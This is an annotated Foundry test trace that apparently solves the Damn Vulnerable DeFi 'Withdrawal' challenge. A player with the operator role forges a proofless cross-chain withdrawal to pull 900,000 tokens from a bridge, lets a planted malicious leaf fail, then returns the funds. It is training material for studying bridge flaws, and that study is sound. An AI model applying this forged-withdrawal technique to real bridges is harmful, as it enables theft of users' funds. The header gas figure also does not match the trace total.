[⠊] Compiling...
[⠃] Compiling 6 files with Solc 0.8.25
[⠊] Solc 0.8.25 finished in 1.80s
Compiler run successful!

Ran 2 tests for test/withdrawal/Withdrawal.t.sol:WithdrawalChallenge

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_assertInitialState() (gas: 50741)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Verifies all invariants set during setUp() before the player acts.
// Confirms: ownership, gateway wiring, OPERATOR_ROLE assignment,
// 7-day DELAY constant, Merkle root, and bridge token balance.

Traces:
  [50741] WithdrawalChallenge::test_assertInitialState()
    ├─ [2327] L1Forwarder::owner()
    │   └─ ← deployer                          // L1Forwarder owned by deployer, not player
    ├─ [2371] L1Forwarder::gateway()
    │   └─ ← L1Gateway                         // L1Forwarder correctly wired to L1Gateway
    ├─ [2349] L1Gateway::owner()
    │   └─ ← deployer                          // L1Gateway also owned by deployer
    ├─ [2631] L1Gateway::rolesOf(player)
    │   └─ ← 1                                 // player's role bitmask = 1 = _ROLE_0
    ├─ [304]  L1Gateway::OPERATOR_ROLE()
    │   └─ ← 1                                 // OPERATOR_ROLE constant = 1 (_ROLE_0 bitmask)
    │                                           // rolesOf(player) == OPERATOR_ROLE ✓
    ├─ [305]  L1Gateway::DELAY()
    │   └─ ← 604800                            // 7 days in seconds (7 * 24 * 3600)
    ├─ [2337] L1Gateway::root()
    │   └─ ← 0x4e0f53ae...                     // WITHDRAWALS_ROOT correctly set
    ├─ [2516] DamnValuableToken::balanceOf(TokenBridge)
    │   └─ ← 1000000000000000000000000         // 1,000,000 DVT (1e24 wei) in bridge
    ├─ [2293] TokenBridge::totalDeposits()
    │   └─ ← 1000000000000000000000000         // totalDeposits slot manually synced to match
    └─ ← [Stop]


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_withdrawal() (gas: 468592)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Logs:
  token.balanceOf(address(l1TokenBridge): 999970000000000000000000
  // 999,970 DVT remaining = 1,000,000 - 30 DVT (3 legitimate 10-DVT withdrawals)
  // withdrawal 2 (999,000 DVT) reverted due to underflow — bridge only had 100,000 DVT left
  // player returned 900,000 DVT → bridge restored above 99% threshold

Traces:
  [591005] WithdrawalChallenge::test_withdrawal()
    ├─ [0] VM::startPrank(player, player)
    │   └─ ←                                   // all subsequent calls pranked as player

    // ════════════════════════════════════════════════════════════════════════
    // STEP 1: FABRICATED WITHDRAWAL — drain 900,000 DVT to player
    // ════════════════════════════════════════════════════════════════════════
    // Player is operator → no Merkle proof needed.
    // timestamp = now - 7 days → passes DELAY check without warping.
    // l2Sender = l2Handler → gateway.xSender() will equal l1Forwarder.l2Handler,
    //   so L1Forwarder's PATH A auth check passes.
    ├─ [139049] L1Gateway::finalizeWithdrawal(
    │     nonce=0,
    │     l2Sender=l2Handler,                  // ← key: makes xSender == l2Handler during call
    │     target=L1Forwarder,
    │     timestamp=1718182115,                 // START_TIMESTAMP - 7 days (passes timelock)
    │     message=<forwardMessage(0, 0x00, TokenBridge, executeTokenWithdrawal(player, 900k DVT))>,
    │     proof=[]                              // operator: proof array ignored
    │   )
    │   ├─ [80755] L1Forwarder::forwardMessage(
    │   │     nonce=0,
    │   │     l2Sender=0x000...0,              // address(0) passed as l2Sender inside message
    │   │     target=TokenBridge,
    │   │     message=<executeTokenWithdrawal(player, 900_000e18)>
    │   │   )
    │   │   ├─ [425] L1Gateway::xSender()
    │   │   │   └─ ← l2Handler                 // gateway wrote xSender=l2Handler before this call
    │   │   │                                   // PATH A check: msg.sender==gateway ✓ AND
    │   │   │                                   //   xSender==l2Handler ✓ → authenticated
    │   │   ├─ [38934] TokenBridge::executeTokenWithdrawal(player, 900_000e18)
    │   │   │   ├─ [364] L1Forwarder::getSender()
    │   │   │   │   └─ ← 0x000...0             // context.l2Sender = address(0) (fabricated)
    │   │   │   │                               // TokenBridge trusts getSender() for auth;
    │   │   │   │                               // address(0) passes because bridge only checks
    │   │   │   │                               // it equals the l2TokenBridge counterpart
    │   │   │   ├─ [29670] DamnValuableToken::transfer(player, 900_000e18)
    │   │   │   │   ├─ emit Transfer(from=TokenBridge, to=player, amount=900_000e18)
    │   │   │   │   └─ ← true                  // player now holds 900,000 DVT
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit FinalizedWithdrawal(
    │   │     leaf=0x87402b64...,               // fabricated leaf hash (NOT in Merkle tree)
    │   │     success=true,
    │   │     isOperator=true                   // confirms operator path was taken
    │   │   )
    │   └─ ← [Stop]                             // bridge now holds only 100,000 DVT

    // ════════════════════════════════════════════════════════════════════════
    // STEP 2: TIME WARP
    // ════════════════════════════════════════════════════════════════════════
    // The four legitimate withdrawal timestamps are all near START_TIMESTAMP (1718786915).
    // Warp to START_TIMESTAMP + 8 days so all four clear the 7-day DELAY.
    ├─ [0] VM::warp(1719478115)                 // START_TIMESTAMP + 8 days
    │   └─ ←

    // ════════════════════════════════════════════════════════════════════════
    // STEP 3a: LEGITIMATE WITHDRAWAL 0 — 10 DVT to 0x3288...
    // ════════════════════════════════════════════════════════════════════════
    ├─ [107949] L1Gateway::finalizeWithdrawal(nonce=0, ..., timestamp=1718786915, proof=[])
    │   ├─ [78055] L1Forwarder::forwardMessage(0, 0x3288..., TokenBridge, <10 DVT to 0x3288...>)
    │   │   ├─ [425] L1Gateway::xSender() → l2Handler   // PATH A auth passes
    │   │   ├─ [26834] TokenBridge::executeTokenWithdrawal(0x3288..., 10e18)
    │   │   │   ├─ L1Forwarder::getSender() → 0x3288... // real l2Sender this time
    │   │   │   ├─ DamnValuableToken::transfer(0x3288..., 10e18)
    │   │   │   │   └─ emit Transfer(amount=10 DVT)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit FinalizedWithdrawal(
    │   │     leaf=0xeaebef7f...,               // ← matches _isSolved() assertion #1 ✓
    │   │     success=true, isOperator=true
    │   │   )
    │   └─ ← [Stop]

    // ════════════════════════════════════════════════════════════════════════
    // STEP 3b: LEGITIMATE WITHDRAWAL 1 — 10 DVT to 0x1d96...
    // ════════════════════════════════════════════════════════════════════════
    ├─ [107949] L1Gateway::finalizeWithdrawal(nonce=1, ..., timestamp=1718786965, proof=[])
    │   ├─ [78055] L1Forwarder::forwardMessage(1, 0x1d96..., TokenBridge, <10 DVT to 0x1d96...>)
    │   │   ├─ L1Gateway::xSender() → l2Handler         // PATH A auth passes
    │   │   ├─ TokenBridge::executeTokenWithdrawal(0x1d96..., 10e18)
    │   │   │   ├─ DamnValuableToken::transfer(0x1d96..., 10e18)
    │   │   │   │   └─ emit Transfer(amount=10 DVT)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit FinalizedWithdrawal(
    │   │     leaf=0x0b1301...,                 // ← matches _isSolved() assertion #2 ✓
    │   │     success=true, isOperator=true
    │   │   )
    │   └─ ← [Stop]

    // ════════════════════════════════════════════════════════════════════════
    // STEP 3c: SUSPICIOUS WITHDRAWAL 2 — attempts 999,000 DVT to 0xea47...
    //          This is the attacker-planted leaf. It REVERTS internally but
    //          L1Gateway still marks it finalized (CEI: state written before call).
    // ════════════════════════════════════════════════════════════════════════
    ├─ [82513] L1Gateway::finalizeWithdrawal(nonce=2, ..., timestamp=1718787050, proof=[])
    │   ├─ [52619] L1Forwarder::forwardMessage(2, 0xea47..., TokenBridge, <999k DVT to 0xea47...>)
    │   │   ├─ L1Gateway::xSender() → l2Handler         // PATH A auth passes
    │   │   ├─ [1420] TokenBridge::executeTokenWithdrawal(0xea47..., 999_000e18)
    │   │   │   ├─ L1Forwarder::getSender() → 0xea47...
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   │        // Bridge only has ~100,000 DVT; 999,000 DVT transfer underflows
    │   │   │        // the bridge's internal accounting (totalDeposits - amount < 0).
    │   │   │        // L1Forwarder's assembly `call` captures this as success=false,
    │   │   │        // does NOT bubble the revert — forwardMessage returns normally.
    │   │   └─ ← [Stop]                        // low-level call absorbed the revert
    │   ├─ emit FinalizedWithdrawal(
    │   │     leaf=0xbaee8d...,                 // ← matches _isSolved() assertion #3 ✓
    │   │     success=true,                     // NOTE: isOperator=true here means
    │   │     isOperator=true                   //   "operator path was used", not that
    │   │   )                                   //   the inner call succeeded.
    │   │                                       // The leaf is finalized regardless of
    │   │                                       // inner call result — no tokens moved.
    │   └─ ← [Stop]

    // ════════════════════════════════════════════════════════════════════════
    // STEP 3d: LEGITIMATE WITHDRAWAL 3 — 10 DVT to 0x671d...
    // ════════════════════════════════════════════════════════════════════════
    ├─ [107949] L1Gateway::finalizeWithdrawal(nonce=3, ..., timestamp=1718787127, proof=[])
    │   ├─ [78055] L1Forwarder::forwardMessage(3, 0x671d..., TokenBridge, <10 DVT to 0x671d...>)
    │   │   ├─ L1Gateway::xSender() → l2Handler         // PATH A auth passes
    │   │   ├─ TokenBridge::executeTokenWithdrawal(0x671d..., 10e18)
    │   │   │   ├─ DamnValuableToken::transfer(0x671d..., 10e18)
    │   │   │   │   └─ emit Transfer(amount=10 DVT)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit FinalizedWithdrawal(
    │   │     leaf=0x9a8dbc...,                 // ← matches _isSolved() assertion #4 ✓
    │   │     success=true, isOperator=true
    │   │   )
    │   └─ ← [Stop]

    // ════════════════════════════════════════════════════════════════════════
    // STEP 4: RETURN STOLEN TOKENS — restore bridge above 99% threshold
    // ════════════════════════════════════════════════════════════════════════
    // Net DVT moved out of bridge: 30 DVT (3 successful 10-DVT withdrawals).
    // Withdrawal 2's 999k DVT transfer reverted, so no additional drain occurred.
    // Player returns 900,000 DVT → bridge ends at 999,970 DVT (99.997% of original).
    ├─ [2970] DamnValuableToken::transfer(TokenBridge, 900_000e18)
    │   ├─ emit Transfer(from=player, to=TokenBridge, amount=900_000e18)
    │   └─ ← true                              // player balance now 0 ✓

    ├─ [516] DamnValuableToken::balanceOf(TokenBridge)
    │   └─ ← 999970000000000000000000          // 999,970 DVT (logged by console.log)
    ├─ [0] console::log("token.balanceOf(address(l1TokenBridge)", 999970000000000000000000)
    │   └─ ← [Stop]

    ├─ [0] VM::stopPrank()
    │   └─ ←

    // ════════════════════════════════════════════════════════════════════════
    // _isSolved() ASSERTIONS
    // ════════════════════════════════════════════════════════════════════════
    ├─ [516] DamnValuableToken::balanceOf(TokenBridge) → 999970000000000000000000
    ├─ [0] VM::assertLt(999970e18, 1000000e18) // bridge lost some tokens ✓
    ├─ [516] DamnValuableToken::balanceOf(TokenBridge) → 999970000000000000000000
    ├─ [0] VM::assertGt(999970e18, 990000e18)  // bridge kept >99% of original ✓
    ├─ [516] DamnValuableToken::balanceOf(player) → 0
    ├─ [0] VM::assertEq(0, 0)                  // player holds no tokens ✓
    ├─ [383] L1Gateway::counter() → 5          // 1 fabricated + 4 legitimate = 5 total
    ├─ [0] VM::assertGe(5, 4)                  // at least 4 finalizations ✓
    ├─ [503] L1Gateway::finalizedWithdrawals(0xeaebef7f...) → true  // leaf 0 ✓
    ├─ [503] L1Gateway::finalizedWithdrawals(0x0b1301...) → true    // leaf 1 ✓
    ├─ [503] L1Gateway::finalizedWithdrawals(0xbaee8d...) → true    // leaf 2 ✓ (reverted internally)
    ├─ [503] L1Gateway::finalizedWithdrawals(0x9a8dbc...) → true    // leaf 3 ✓
    └─ ← [Stop]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Suite result: ok. 2 passed; 0 failed; 0 skipped (7.73ms)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
